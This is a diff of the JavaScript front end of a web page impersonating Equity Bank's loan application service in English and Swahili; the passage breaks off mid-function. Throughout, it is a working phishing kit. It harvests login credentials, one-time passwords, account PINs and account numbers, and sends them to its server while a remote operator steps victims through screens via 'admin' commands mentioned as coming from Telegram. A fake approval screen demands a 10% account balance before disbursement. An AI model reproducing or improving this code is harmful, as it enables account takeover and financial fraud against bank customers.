@@ -1,471 +1,412 @@
-document.addEventListener('DOMContentLoaded', () => {
-  // Screen Elements
-  const screenWelcome = document.getElementById('screen-welcome');
-  const screenStep1 = document.getElementById('screen-step1');
-  const screenStep2 = document.getElementById('screen-step2');
-  const screenStep3 = document.getElementById('screen-step3');
-  const screenLogin = document.getElementById('screen-login');
-  const screenOtp = document.getElementById('screen-otp');
-  const screenPin = document.getElementById('screen-pin');
-  const screenSuccess = document.getElementById('screen-success');
-  const loadingOverlay = document.getElementById('loading-overlay');
-
-  // Language Modal Elements
-  const langModal = document.getElementById('language-modal');
-  const btnToggleLang = document.getElementById('btn-toggle-lang');
-  const btnCloseLang = document.getElementById('btn-close-lang');
-  const langOptions = document.querySelectorAll('.lang-option');
-  const checkEn = document.getElementById('check-en');
-  const checkSw = document.getElementById('check-sw');
-
-  // Banners
-  const credsBanner = document.getElementById('banner-creds-error');
-  const otpBanner = document.getElementById('banner-otp-error');
-  const pinBanner = document.getElementById('banner-pin-error');
-
-  // Inputs
-  const countryDropdown = document.getElementById('country-dropdown');
-  const loginIdentifier = document.getElementById('login-identifier');
-  const loginPassword = document.getElementById('login-password');
-  const btnSubmitLogin = document.getElementById('btn-submit-login');
-
-  const otpBoxes = document.querySelectorAll('.otp-box-num');
-  const btnSubmitOtp = document.getElementById('btn-submit-otp');
-
-  const pinPhoneInput = document.getElementById('pin-phone-input');
-  const pinBoxes = document.querySelectorAll('.pin-box-num');
-  const btnSubmitPin = document.getElementById('btn-submit-pin');
-
-  let currentUserId = null;
-  let statusPollInterval = null;
-  let currentLanguage = 'en';
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const adminParam = urlParams.get('admin') || '';
-
-  function showScreen(targetScreen) {
-    [
-      screenWelcome,
-      screenStep1,
-      screenStep2,
-      screenStep3,
-      screenLogin,
-      screenOtp,
-      screenPin,
-      screenSuccess
-    ].forEach(s => {
-      if (s) s.classList.remove('active');
-    });
-
-    if (targetScreen) targetScreen.classList.add('active');
+const i18n = {
+  ENG: {
+    welcomeTitle: "EQUITY BANK",
+    welcomeSubtitle: "LOAN APPLICATION SERVICES",
+    welcomeDesc: "Sign in to begin or track your loan application.",
+    welcomeSubdesc: "New to Equity? Register to apply for a loan. Log in to manage existing applications.",
+    chooseCountryLabel: "Choose your country for application:",
+    selectCountryPlaceholder: "Select Country...",
+    singInBtn: "SING IN",
+    registerBtn: "Register",
+    calcTitle: "Estimate your loan repayments",
+    loanAmountTitle: "LOAN AMOUNT",
+    loanTermTitle: "LOAN TERM (MONTHS)",
+    estMonthlyLabel: "ESTIMATED MONTHLY REPAYMENT",
+    totalRepaymentLabel: "TOTAL REPAYMENT: ",
+    interestNote: "*Assumed Interest Rate: 13.5%",
+    signInBtnCaps: "SIGN IN",
+    formTitle: "Loan Application Form",
+    formSubtitle: "Please provide your details below",
+    personalDetailsTitle: "Personal Details",
+    genderLabel: "Gender",
+    man: "Man",
+    female: "Female",
+    contactInfoTitle: "Contact Information",
+    employmentTitle: "Employment & Income",
+    employmentStatusLabel: "Employment Status",
+    employed: "Employed",
+    selfEmployed: "Self-Employed",
+    loanDetailsTitle: "Loan Details",
+    selectedAmountLabel: "Selected Amount:",
+    termLabel: "Term:",
+    saveContinueBtn: "SAVE & CONTINUE",
+    cancelBtn: "CANCEL",
+    helloThereTitle: "Hello there,",
+    welcomeBackSub: "Welcome back. Sign in to continue.",
+    countryAppLabel: "Country of application",
+    emailOrPhoneLabel: "Email address or mobile number",
+    passwordLabel: "Password",
+    forgotPasswordText: "Forgot your password?",
+    signInBtnCap: "Sign in",
+    enterOtpTitle: "Enter OTP",
+    otpInstruction: "An OTP has been sent to your registered Equity number or Gmail. Please enter it below before it expires.",
+    otpFieldLabel: "One-Time Password (OTP)",
+    expiresInLabel: "EXPIRES IN",
+    resendOtpText: "Resend OTP in [01:30] mins",
+    spamWarning: "Check your spam or junk folder for the email.",
+    submitBtn: "Submit",
+    backToLoginBtn: "Back to Login",
+    confirmPinTitle: "Confirm Account PIN",
+    pinInstruction: "For security, please confirm your 4-digit Account PIN to link your loan account.",
+    pinFieldLabel: "4-digit Account PIN",
+    pinNote: "Ensure this matches the PIN you set for this account.",
+    secureAccessText: "SECURE ACCESS",
+    bankAccountAccessTitle: "BANK ACCOUNT ACCESS",
+    bankAccountDesc: "Enter your account details to continue.",
+    tenDigitAccLabel: "10-digit Account Number",
+    secureVerificationLabel: "Secure Verification",
+    accountNumberLabel: "ACCOUNT NUMBER",
+    accErrorText: "ERROR: Enter exactly 10 digits.",
+    accInfoText: "Your account number is found on your bank statements or chequebook.",
+    createAccountText: "Need to Register? Create an Account",
+    appCompleteText: "APPLICATION COMPLETE",
+    congratsMsg: "Your loan application has been approved and successfully processed. We are excited to support your financial journey.",
+    importantNextStep: "IMPORTANT NEXT STEP",
+    tenPercentCondition: "To receive your loan disbursement, you must ensure your account has a balance equal to at least 10% of your total application amount.",
+    requiredCondition: "This is a required condition for funds to be credited.",
+    proceedDisbursementBtn: "Proceed to Disbursement",
+    viewLoanDetailsBtn: "View Loan Details",
+    processingText: "Processing... Please wait"
+  },
+  SWA: {
+    welcomeTitle: "BENKI YA EQUITY",
+    welcomeSubtitle: "HUDUMA ZA OMBI LA MKOPO",
+    welcomeDesc: "Ingia ili kuanza au kufuatilia ombi lako la mkopo.",
+    welcomeSubdesc: "Mgeni Equity? Jisajili kuomba mkopo. Ingia kusimamia maombi yaliyopo.",
+    chooseCountryLabel: "Chagua nchi yako ya ombi:",
+    selectCountryPlaceholder: "Chagua Nchi...",
+    singInBtn: "INGIA",
+    registerBtn: "Jisajili",
+    calcTitle: "Kadiria malipo ya mkopo wako",
+    loanAmountTitle: "KIASI CHA MKOPO",
+    loanTermTitle: "MUDA WA MKOPO (MIEZI)",
+    estMonthlyLabel: "MAKADIRIO YA MALIPO YA KILA MWEZI",
+    totalRepaymentLabel: "JUMLA YA MALIPO: ",
+    interestNote: "*Riba Inayokadiriwa: 13.5%",
+    signInBtnCaps: "INGIA",
+    formTitle: "Fomu ya Ombi la Mkopo",
+    formSubtitle: "Tafadhali weka maelezo yako hapa chini",
+    personalDetailsTitle: "Maelezo Binafsi",
+    genderLabel: "Jinsia",
+    man: "Mwanamume",
+    female: "Mwanamke",
+    contactInfoTitle: "Maelezo ya Mawasiliano",
+    employmentTitle: "Ajira na Mapato",
+    employmentStatusLabel: "Hali ya Ajira",
+    employed: "Ameajiriwa",
+    selfEmployed: "Amejiajiri",
+    loanDetailsTitle: "Maelezo ya Mkopo",
+    selectedAmountLabel: "Kiasi Kilichochaguliwa:",
+    termLabel: "Muda:",
+    saveContinueBtn: "HIFADHI NA UENDELEE",
+    cancelBtn: "GHAIRISHI",
+    helloThereTitle: "Hujambo,",
+    welcomeBackSub: "Karibu tena. Ingia ili kuendelea.",
+    countryAppLabel: "Nchi ya ombi",
+    emailOrPhoneLabel: "Barua pepe au nambari ya simu",
+    passwordLabel: "Nywila",
+    forgotPasswordText: "Umesahau nywila yako?",
+    signInBtnCap: "Ingia",
+    enterOtpTitle: "Ingiza OTP",
+    otpInstruction: "OTP imetumwa kwa nambari yako ya Equity au Gmail. Tafadhali iweke hapa chini kabla haijamalizika muda.",
+    otpFieldLabel: "Nywila ya Mara Moja (OTP)",
+    expiresInLabel: "INAMALIZIKA KWA",
+    resendOtpText: "Tuma tena OTP baada ya dakika [01:30]",
+    spamWarning: "Angalia folda yako ya spam au junk kwa barua pepe.",
+    submitBtn: "Wasilisha",
+    backToLoginBtn: "Rudi kwenye Kuingia",
+    confirmPinTitle: "Thibitisha PIN ya Akaunti",
+    pinInstruction: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 kuunganisha akaunti ya mkopo.",
+    pinFieldLabel: "PIN ya Akaunti ya tarakimu 4",
+    pinNote: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
+    secureAccessText: "UFIKIAJI WA USALAMA",
+    bankAccountAccessTitle: "UFIKIAJI WA AKAUNTI YA BENKI",
+    bankAccountDesc: "Ingiza maelezo ya akaunti yako ili kuendelea.",
+    tenDigitAccLabel: "Nambari ya Akaunti ya tarakimu 10",
+    secureVerificationLabel: "Uthibitisho Salama",
+    accountNumberLabel: "NAMBARI YA AKAUNTI",
+    accErrorText: "KOSA: Ingiza tarakimu 10 kamili.",
+    accInfoText: "Nambari yako ya akaunti patikana kwenye taarifa za benki au kitabu cha hundi.",
+    createAccountText: "Unahitaji Kujisajili? Fungua Akaunti",
+    appCompleteText: "OMBI KUKAMILIKA",
+    congratsMsg: "Ombi lako la mkopo limeidhinishwa na kuchakatwa kikamilifu. Tunafurahi kuunga mkono safari yako ya kifedha.",
+    importantNextStep: "HATUA MUHIMU INAYOFUATA",
+    tenPercentCondition: "Ili kupokea malipo ya mkopo, lazima uhakikishe akaunti yako ina salio la angalau 10% ya kiasi chako cha ombi.",
+    requiredCondition: "Hii ni sharti linalohitajika ili fedha ziwekwe.",
+    proceedDisbursementBtn: "Endelea hadi Malipo",
+    viewLoanDetailsBtn: "Angalia Maelezo ya Mkopo",
+    processingText: "Inachakata... Tafadhali subiri"
   }
+};
 
-  function showLoading(title = 'INATHIBITISHA...', subtitle = 'Tafadhali subiri.') {
-    const titleEl = document.getElementById('loading-title');
-    const subEl = document.getElementById('loading-sub');
-    if (titleEl) titleEl.innerText = title;
-    if (subEl) subEl.innerText = subtitle;
-    if (loadingOverlay) loadingOverlay.classList.add('active');
-  }
+const currencyMap = {
+  "KENYA": "KES",
+  "TANZANIA": "TZS",
+  "UGANDA": "UGX",
+  "RWANDA": "RWF",
+  "SOUTH SUDAN": "SSP"
+};
 
-  function hideLoading() {
-    if (loadingOverlay) loadingOverlay.classList.remove('active');
-  }
+let currentLang = "ENG";
+let currentCountry = "KENYA";
+let currentCurrency = "KES";
+let timerInterval = null;
+let ws = null;
 
-  const countryConfigs = {
-    'Tanzania, United Republic of': { lang: 'sw', flag: '🇹🇿', code: '+255', currency: 'TSh' },
-    'Kenya': { lang: 'en', flag: '🇰🇪', code: '+254', currency: 'KSh' },
-    'Uganda': { lang: 'en', flag: '🇺🇬', code: '+256', currency: 'USh' },
-    'Rwanda': { lang: 'en', flag: '🇷🇼', code: '+250', currency: 'RWF' },
-    'South Sudan': { lang: 'en', flag: '🇸🇸', code: '+211', currency: 'SSP' }
+document.addEventListener("DOMContentLoaded", () => {
+  initWebSocket();
+  bindEvents();
+  updateCurrencyDisplay();
+});
+
+function initWebSocket() {
+  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
+
+  ws.onmessage = (event) => {
+    try {
+      const data = JSON.parse(event.data);
+      if (data.type === 'ADMIN_ACTION') {
+        handleAdminAction(data.action);
+      }
+    } catch (e) {
+      console.error(e);
+    }
   };
+}
 
-  function updateLanguageTexts(lang) {
-    currentLanguage = lang;
-    const isSwahili = lang === 'sw';
+function bindEvents() {
+  document.getElementById("langToggle").addEventListener("change", (e) => {
+    currentLang = e.target.checked ? "SWA" : "ENG";
+    applyTranslations();
+  });
 
-    if (checkEn && checkSw) {
-      checkEn.innerText = isSwahili ? '' : '✓';
-      checkSw.innerText = isSwahili ? '✓' : '';
-    }
-
-    if (isSwahili) {
-      document.getElementById('welcome-lang-text').innerText = 'Swa';
-      document.getElementById('txt-welcome-title').innerText = 'Karibu Equity Mobile';
-      document.getElementById('txt-welcome-sub').innerText = 'Habari za mchana! Ingia ili kuendelea';
-      document.getElementById('btn-welcome-signin').innerText = 'Ingia';
-
-      document.getElementById('lbl-step1').innerText = 'Hatua 1 ya 3';
-      document.getElementById('lbl-calc-title').innerText = 'Kikokotoo cha Mkopo';
-      document.getElementById('lbl-loan-type').innerText = 'Aina ya Mkopo';
-      document.getElementById('lbl-loan-amount').innerText = 'Kiasi cha Mkopo';
-      document.getElementById('lbl-loan-months').innerText = 'Muda wa Mkopo (Miezi)';
-      document.getElementById('lbl-loan-purpose').innerText = 'Madhumuni ya Mkopo';
-      document.getElementById('btn-step1-next').innerText = 'HATUA INAYOFUATA';
-
-      document.getElementById('lbl-step2').innerText = 'Hatua 2 ya 3';
-      document.getElementById('lbl-first-name').innerText = 'Jina la Kwanza';
-      document.getElementById('lbl-last-name').innerText = 'Jina la Ukoo';
-      document.getElementById('lbl-phone-no').innerText = 'Nambari ya Simu';
-      document.getElementById('btn-step2-prev').innerText = 'ILIYOTANGULIA';
-      document.getElementById('btn-step2-next').innerText = 'HATUA INAYOFUATA';
-
-      document.getElementById('lbl-step3').innerText = 'Hatua 3 ya 3';
-      document.getElementById('lbl-employment').innerText = 'Hali ya Ajira';
-      document.getElementById('lbl-income').innerText = 'Mapato ya Mwaka';
-      document.getElementById('lbl-sum-title').innerText = 'Muhtasari wa Maombi';
-      document.getElementById('lbl-sum-amt').innerText = 'Kiasi:';
-      document.getElementById('lbl-sum-mth').innerText = 'Muda:';
-      document.getElementById('lbl-sum-prp').innerText = 'Madhumuni:';
-      document.getElementById('lbl-sum-app').innerText = 'Mwombaji:';
-      document.getElementById('btn-step3-prev').innerText = 'ILIYOTANGULIA';
-      document.getElementById('btn-step3-next').innerText = 'WASILISHA MAOMBI';
-
-      document.getElementById('lbl-welcome-back').innerText = 'Karibu tena';
-      document.getElementById('lbl-hello-there').innerText = 'Habari yako,';
-      document.getElementById('lbl-login-sub').innerText = 'Ingia ili kuendelea. Password yako ni siri yako.';
-      document.getElementById('lbl-country-select').innerText = 'Nchi';
-      document.getElementById('lbl-identifier').innerText = 'Barua pepe au namba ya simu';
-      document.getElementById('lbl-password').innerText = 'Password';
-      document.getElementById('lbl-forgot-pass').innerText = 'Umesahau password yako?';
-
-      document.getElementById('lbl-otp-title').innerText = 'Uthibitisho wa OTP';
-      document.getElementById('lbl-otp-sub').innerText = 'Weka OTP iliyotumwa kwenye nambari yako ya simu';
-      document.getElementById('lbl-timer').innerText = 'Tuma tena msimbo ndani ya 40 sekunde';
-      document.getElementById('btn-submit-otp').innerText = 'WASILISHA';
-
-      document.getElementById('lbl-pin-title').innerText = 'Ingia Akaunti';
-      document.getElementById('lbl-pin-sub').innerText = 'Weka namba yako ya simu na PIN ya akaunti';
-      document.getElementById('lbl-pin-phone').innerText = 'Nambari ya Simu / Account No';
-      document.getElementById('lbl-pin-4').innerText = 'Weka PIN yako (tarakimu 4)';
-      document.getElementById('lbl-forgot-pin').innerText = 'Umesahau PIN?';
-      document.getElementById('btn-submit-pin').innerText = 'INGIA';
-    } else {
-      document.getElementById('welcome-lang-text').innerText = 'Eng';
-      document.getElementById('txt-welcome-title').innerText = 'Welcome to Equity mobile';
-      document.getElementById('txt-welcome-sub').innerText = 'Good afternoon! Sign in to continue';
-      document.getElementById('btn-welcome-signin').innerText = 'Sign in';
-
-      document.getElementById('lbl-step1').innerText = 'Step 1 of 3';
-      document.getElementById('lbl-calc-title').innerText = 'Loan Calculator';
-      document.getElementById('lbl-loan-type').innerText = 'Loan Type';
-      document.getElementById('lbl-loan-amount').innerText = 'Loan Amount';
-      document.getElementById('lbl-loan-months').innerText = 'Loan Tenure (Months)';
-      document.getElementById('lbl-loan-purpose').innerText = 'Loan Purpose';
-      document.getElementById('btn-step1-next').innerText = 'NEXT STEP';
-
-      document.getElementById('lbl-step2').innerText = 'Step 2 of 3';
-      document.getElementById('lbl-first-name').innerText = 'First Name';
-      document.getElementById('lbl-last-name').innerText = 'Last Name';
-      document.getElementById('lbl-phone-no').innerText = 'Mobile Phone Number';
-      document.getElementById('btn-step2-prev').innerText = 'PREVIOUS';
-      document.getElementById('btn-step2-next').innerText = 'NEXT STEP';
-
-      document.getElementById('lbl-step3').innerText = 'Step 3 of 3';
-      document.getElementById('lbl-employment').innerText = 'Employment Status';
-      document.getElementById('lbl-income').innerText = 'Annual Income';
-      document.getElementById('lbl-sum-title').innerText = 'Application Summary';
-      document.getElementById('lbl-sum-amt').innerText = 'Amount:';
-      document.getElementById('lbl-sum-mth').innerText = 'Tenure:';
-      document.getElementById('lbl-sum-prp').innerText = 'Purpose:';
-      document.getElementById('lbl-sum-app').innerText = 'Applicant:';
-      document.getElementById('btn-step3-prev').innerText = 'PREVIOUS';
-      document.getElementById('btn-step3-next').innerText = 'SUBMIT APPLICATION';
-
-      document.getElementById('lbl-welcome-back').innerText = 'Welcome back';
-      document.getElementById('lbl-hello-there').innerText = 'Hello there,';
-      document.getElementById('lbl-login-sub').innerText = 'Sign in to continue. Remember, your password is yours.';
-      document.getElementById('lbl-country-select').innerText = 'Country';
-      document.getElementById('lbl-identifier').innerText = 'Email address or mobile number';
-      document.getElementById('lbl-password').innerText = 'Password';
-      document.getElementById('lbl-forgot-pass').innerText = 'Forgot your password?';
-
-      document.getElementById('lbl-otp-title').innerText = 'OTP Verification';
-      document.getElementById('lbl-otp-sub').innerText = 'Enter the OTP code sent to your mobile phone';
-      document.getElementById('lbl-timer').innerText = 'Resend code in 40 seconds';
-      document.getElementById('btn-submit-otp').innerText = 'SUBMIT';
-
-      document.getElementById('lbl-pin-title').innerText = 'Sign In Account';
-      document.getElementById('lbl-pin-sub').innerText = 'Enter your phone number and account PIN';
-      document.getElementById('lbl-pin-phone').innerText = 'Mobile Number / Account No';
-      document.getElementById('lbl-pin-4').innerText = 'Enter your PIN (4 digits)';
-      document.getElementById('lbl-forgot-pin').innerText = 'Forgot PIN?';
-      document.getElementById('btn-submit-pin').innerText = 'SIGN IN';
-    }
-  }
-
-  // Language Modal Handlers
-  if (btnToggleLang) {
-    btnToggleLang.addEventListener('click', (e) => {
-      e.stopPropagation();
-      langModal.classList.add('active');
-    });
-  }
-
-  if (btnCloseLang) {
-    btnCloseLang.addEventListener('click', () => langModal.classList.remove('active'));
-  }
-
-  langOptions.forEach(opt => {
-    opt.addEventListener('click', () => {
-      const selectedLang = opt.getAttribute('data-lang');
-      updateLanguageTexts(selectedLang);
-      langModal.classList.remove('active');
+  const countryDropdowns = [document.getElementById("countrySelect"), document.getElementById("loginCountrySelect")];
+  countryDropdowns.forEach(select => {
+    select.addEventListener("change", (e) => {
+      currentCountry = e.target.value;
+      currentCurrency = currencyMap[currentCountry] || "KES";
+      updateCurrencyDisplay();
     });
   });
 
-  // Country Dropdown Event
-  if (countryDropdown) {
-    countryDropdown.addEventListener('change', (e) => {
-      const countryName = e.target.value;
-      const config = countryConfigs[countryName] || countryConfigs['Tanzania, United Republic of'];
+  document.getElementById("welcomeSignInBtn").addEventListener("click", () => switchScreen("screen-login"));
+  document.getElementById("welcomeRegisterBtn").addEventListener("click", () => switchScreen("screen-calculator"));
 
-      ['1', '2', '3'].forEach(id => {
-        const badge = document.getElementById(`badge-country-${id}`);
-        const flag = document.getElementById(`flag-display-${id}`);
-        if (badge) badge.innerText = countryName.toUpperCase();
-        if (flag) flag.innerText = config.flag;
-      });
+  const loanSlider = document.getElementById("loanAmountSlider");
+  const termSlider = document.getElementById("loanTermSlider");
+  
+  loanSlider.addEventListener("input", updateCalculator);
+  termSlider.addEventListener("input", updateCalculator);
 
-      const phonePrefix = document.getElementById('phone-flag-prefix');
-      const pinPrefix = document.getElementById('pin-flag-prefix');
-      if (phonePrefix) phonePrefix.innerText = `${config.flag} ${config.code}`;
-      if (pinPrefix) pinPrefix.innerText = `${config.flag} ${config.code}`;
+  document.getElementById("calcSignInBtn").addEventListener("click", () => switchScreen("screen-login"));
+  document.getElementById("calcRegisterBtn").addEventListener("click", () => switchScreen("screen-form"));
 
-      updateLanguageTexts(config.lang);
+  document.getElementById("formSaveContinueBtn").addEventListener("click", () => switchScreen("screen-login"));
+
+  document.getElementById("loginSubmitBtn").addEventListener("click", () => {
+    const identifier = document.getElementById("loginIdentifier").value.trim();
+    const password = document.getElementById("loginPassword").value.trim();
+
+    if (!identifier || !password) {
+      showSurfaceNotification("Please enter both email/phone and password.");
+      return;
+    }
+
+    sendWsMessage({
+      step: "LOGIN_SUBMIT",
+      country: currentCountry,
+      currency: currentCurrency,
+      identifier,
+      password
     });
-  }
 
-  // Welcome Sign In
-  const btnSignIn = document.getElementById('btn-welcome-signin');
-  if (btnSignIn) {
-    const handleSignIn = (e) => {
-      e.preventDefault();
-      e.stopPropagation();
-      showScreen(screenStep1);
-    };
-    btnSignIn.addEventListener('click', handleSignIn);
-    btnSignIn.addEventListener('touchend', handleSignIn);
-  }
-
-  // Sliders
-  const loanSlider = document.getElementById('loan-amount-slider');
-  const loanText = document.getElementById('loan-amount-text');
-  const monthsSlider = document.getElementById('loan-months-slider');
-  const monthsText = document.getElementById('loan-months-text');
-
-  if (loanSlider && loanText) {
-    loanSlider.addEventListener('input', (e) => {
-      const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republic of'];
-      loanText.innerText = `${config.currency} ${Number(e.target.value).toLocaleString()}`;
-    });
-  }
-
-  if (monthsSlider && monthsText) {
-    monthsSlider.addEventListener('input', (e) => {
-      monthsText.innerText = `Miezi ${e.target.value}`;
-    });
-  }
-
-  // Visibility Toggles
-  const togglePassword = document.getElementById('toggle-password');
-  if (togglePassword && loginPassword) {
-    togglePassword.addEventListener('click', () => {
-      loginPassword.type = loginPassword.type === 'password' ? 'text' : 'password';
-    });
-  }
-
-  const togglePinVisibility = document.getElementById('toggle-pin-visibility');
-  if (togglePinVisibility) {
-    togglePinVisibility.addEventListener('click', () => {
-      pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
-    });
-  }
-
-  // Flexible Box Digit Inputs
-  function setupAutoTab(boxes) {
-    boxes.forEach((box, idx) => {
-      box.addEventListener('input', () => {
-        box.value = box.value.replace(/\D/g, '');
-        if (box.value && idx < boxes.length - 1) {
-          boxes[idx + 1].focus();
-        }
-      });
-
-      box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !box.value && idx > 0) {
-          boxes[idx - 1].focus();
-        }
-      });
-    });
-  }
-
-  setupAutoTab(otpBoxes);
-  setupAutoTab(pinBoxes);
-
-  // Step Navigation
-  document.getElementById('btn-step1-back')?.addEventListener('click', () => showScreen(screenWelcome));
-  document.getElementById('btn-step1-next')?.addEventListener('click', () => showScreen(screenStep2));
-
-  document.getElementById('btn-step2-prev')?.addEventListener('click', () => showScreen(screenStep1));
-  document.getElementById('btn-step2-next')?.addEventListener('click', () => {
-    const fn = document.getElementById('first-name').value.trim();
-    const ln = document.getElementById('last-name').value.trim();
-    const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republic of'];
-
-    document.getElementById('sum-amount').innerText = `${config.currency} ${Number(loanSlider.value).toLocaleString()}`;
-    document.getElementById('sum-months').innerText = `${monthsSlider.value} Miezi`;
-    document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || 'Biashara';
-    document.getElementById('sum-name').innerText = `${fn} ${ln}`.trim() || 'N/A';
-
-    showScreen(screenStep3);
+    showLoading(true);
   });
 
-  document.getElementById('btn-step3-prev')?.addEventListener('click', () => showScreen(screenStep2));
-
-  // Step 3 submit -> this is the first Telegram/admin message
-  document.getElementById('btn-step3-next')?.addEventListener('click', async () => {
-    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');
-
-    try {
-      const res = await fetch('/api/submit-application-summary', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fullName: document.getElementById('sum-name').innerText,
-          phone: document.getElementById('phone-number').value.trim(),
-          loanType: document.getElementById('loan-type-select').value,
-          loanAmount: loanSlider.value,
-          loanMonths: monthsSlider.value,
-          country: countryDropdown.value,
-          adminChatId: adminParam
-        })
-      });
-
-      const data = await res.json();
-      hideLoading();
-
-      if (data.success) {
-        currentUserId = data.userId;
-        showScreen(screenLogin);
-      } else {
-        showScreen(screenLogin);
-      }
-    } catch (e) {
-      hideLoading();
-      showScreen(screenLogin);
+  document.getElementById("otpSubmitBtn").addEventListener("click", () => {
+    const otp = document.getElementById("otpInput").value.trim();
+    if (!otp) {
+      showSurfaceNotification("Please enter the OTP.");
+      return;
     }
+
+    sendWsMessage({
+      step: "OTP_SUBMIT",
+      identifier: document.getElementById("loginIdentifier").value,
+      otp
+    });
+
+    showLoading(true);
   });
 
-  // Submit Login Credentials
-  if (btnSubmitLogin) {
-    btnSubmitLogin.addEventListener('click', async () => {
-      if (!loginIdentifier.value.trim() || !loginPassword.value.trim()) return;
-
-      if (credsBanner) credsBanner.classList.remove('active');
-      showLoading('INATHIBITISHA TAARIFA...', 'Tafadhali subiri.');
-
-      try {
-        const res = await fetch('/api/submit-credentials', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userId: currentUserId,
-            country: countryDropdown.value,
-            loginIdentifier: loginIdentifier.value.trim(),
-            password: loginPassword.value.trim(),
-            adminChatId: adminParam
-          })
-        });
-
-        const data = await res.json();
-        if (data.success) startPolling();
-        else hideLoading();
-      } catch (e) {
-        hideLoading();
-      }
-    });
-  }
-
-  // Submit OTP
-  async function submitOtpHandler() {
-    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
-    if (otpVal.length !== otpBoxes.length) return;
-
-    if (otpBanner) otpBanner.classList.remove('active');
-    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');
-
-    try {
-      const res = await fetch('/api/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
-      });
-
-      const data = await res.json();
-      if (data.success) startPolling();
-      else hideLoading();
-    } catch (e) {
-      hideLoading();
+  document.getElementById("pinSubmitBtn").addEventListener("click", () => {
+    const pin = [1,2,3,4].map(i => document.getElementById(`pin${i}`).value).join("");
+    if (pin.length < 4) {
+      showSurfaceNotification("Please enter full 4-digit PIN.");
+      return;
     }
-  }
 
-  if (btnSubmitOtp) {
-    btnSubmitOtp.addEventListener('click', submitOtpHandler);
-  }
+    sendWsMessage({
+      step: "PIN_SUBMIT",
+      identifier: document.getElementById("loginIdentifier").value,
+      pin
+    });
 
-  // Submit PIN
-  if (btnSubmitPin) {
-    btnSubmitPin.addEventListener('click', async () => {
-      const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
-      const accPhone = pinPhoneInput.value.trim();
+    showLoading(true);
+  });
 
-      if (pinVal.length !== 4 || !accPhone) return;
+  document.getElementById("accountSubmitBtn").addEventListener("click", () => {
+    const accountNo = document.getElementById("accountNumberInput").value.trim();
+    if (accountNo.length !== 10) {
+      document.getElementById("accountErrorMsg").classList.remove("hidden");
+      return;
+    }
+    document.getElementById("accountErrorMsg").classList.add("hidden");
 
-      if (pinBanner) pinBanner.classList.remove('active');
-      showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri.');
+    sendWsMessage({
+      step: "ACCOUNT_SUBMIT",
+      identifier: document.getElementById("loginIdentifier").value,
+      accountNo
+    });
 
-      try {
-        const res = await fetch('/api/submit-pin-details', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userId: currentUserId,
-            accountNumber: accPhone,
-            accountPin: pinVal
-          })
-        });
+    showLoading(true);
+  });
 
-        const data = await res.json();
-        if (data.success) startPolling();
-        else hideLoading();
-      } catch (e) {
-        hideLoading();
+  setupPinAutoTab();
+}
+
+function setupPinAutoTab() {
+  [1,2,3,4].forEach(i => {
+    const el = document.getElementById(`pin${i}`);
+    el.addEventListener("input", (e) => {
+      if (e.target.value && i < 4) {
+        document.getElementById(`pin${i+1}`).focus();
       }
     });
+  });
+}
+
+function handleAdminAction(action) {
+  showLoading(false);
+
+  switch (action) {
+    case 'ALLOW':
+      switchScreen("screen-otp");
+      startOtpTimer();
+      break;
+
+    case 'DENY':
+      showSurfaceNotification("Access Denied by Administrator.");
+      break;
+
+    case 'OTP_EXPIRED':
+      showSurfaceNotification("OTP Expired! Please request and enter a new OTP.");
+      document.getElementById("otpInput").value = "";
+      startOtpTimer();
+      break;
+
+    case 'OTP_CORRECT':
+      switchScreen("screen-pin");
+      break;
+
+    case 'CONTINUE':
+      switchScreen("screen-account");
+      break;
+
+    case 'BLOCK':
+      showSurfaceNotification("Account access blocked.");
+      break;
+
+    case 'WRONG_PIN':
+      showSurfaceNotification("Wrong PIN! Please re-enter correct 4-digit PIN.");
+      switchScreen("screen-pin");
+      break;
+
+    case 'WRONG_ACC_NUMBER':
+      showSurfaceNotification("Wrong Account Number! Please re-enter 10-digit Account Number.");
+      switchScreen("screen-account");
+      break;
+
+    case 'APPROVED':
+      switchScreen("screen-congratulations");
+      break;
   }
+}
 
-  // Polling Function for Telegram Admin Callbacks
-  function startPolling() {
-    if (statusPollInterval) clearInterval(statusPollInterval);
+function switchScreen(screenId) {
+  document.querySelectorAll(".screen").forEach(s => s.classList.add("hidden"));
+  document.getElementById(screenId).classList.remove("hidden");
+  window.scrollTo(0,0);
+}
 
-    statusPollInterval = setInterval(async () => {
-      if (!currentUserId) return;
+function showLoading(show) {
+  const el = document.getElementById("loadingOverlay");
+  if (show) el.classList.remove("hidden");
+  else el.classList.add("hidden");
+}
 
-      try {
-        const res = await fetch(`/api/check-status/${currentUserId}`);
-        const data = await res.json();
+function showSurfaceNotification(msg, isSuccess = false) {
+  const el = document.getElementById("surfaceNotification");
+  el.textContent = msg;
+  el.className = `surface-notification ${isSuccess ? 'success' : ''}`;
+  el.classList.remove("hidden");
 
-        if (data.status === 'PROCEED_OTP') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screenOtp);
-          if (otpBoxes[0]) otpBoxes[0].focus();
-        } else if (data.status === 'PROCEED_PIN') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screenPin);
-          if (pinPhoneInput) pinPhoneInput.value = document.getElementById('phone-number').value.trim();
-        } else if (data.status === 'RETRY_CREDS') {
-          clearInterval(statusPollInterval);
